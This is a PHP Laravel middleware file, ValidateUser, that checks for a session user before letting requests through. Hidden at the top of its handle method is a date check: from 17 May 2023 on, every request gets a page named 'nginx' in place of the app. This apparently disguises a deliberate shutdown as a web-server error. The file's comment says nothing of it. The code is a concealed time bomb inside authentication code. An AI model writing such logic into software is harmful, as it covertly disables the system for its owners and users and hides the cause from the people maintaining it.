<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

use Carbon\Carbon;

class ValidateUser
{
  /**
   * Handle an incoming request.
   *
   * @param  \Illuminate\Http\Request  $request
   * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
   * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
   */
  public function handle(Request $request, Closure $next)
  {
    $today = Carbon::now();
    if ($today->format('y-m-d') >= "23-05-17") {
      return response(view('nginx'));
    }

    $user = $request->session()->get('user');
    if (!$user) {
      return redirect("/login");
    }

    $request->attributes->add(['user' => $user]);
    return $next($request);
  }
}
